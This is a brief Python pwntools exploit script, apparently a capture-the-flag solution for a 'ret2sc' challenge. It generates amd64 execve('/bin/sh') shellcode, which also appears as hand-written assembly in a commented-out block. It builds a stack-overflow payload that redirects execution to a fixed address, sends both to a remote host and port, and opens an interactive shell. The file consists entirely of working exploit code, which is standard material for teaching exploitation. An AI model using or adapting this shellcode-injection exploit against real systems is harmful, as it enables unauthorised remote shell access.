from pwn import *

context.arch = "amd64"

name_addr = 0x601080

shellcode = shellcraft.amd64.linux.sh()
# execve("/bin/sh",null,null)
'''
shellcode = """
    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    jmp str
execve:
    pop rdi
    mov rax, 0x3b
    syscall
exit:
    mov rax, 0x3c
    syscall

str:
    call execve
    .ascii "/bin/sh"
    .byte 0
"""
'''
payload = "A" * 40 + p64(name_addr)

#print shellcode
#print payload

#r = process("./ret2sc")
r = remote("pwnhub.tw", 54321)
r.recvuntil(':')
r.send(asm(shellcode))
r.recvuntil(':')
r.send(payload)
r.interactive()
#name_addr = 0x7ffff7dd60e0
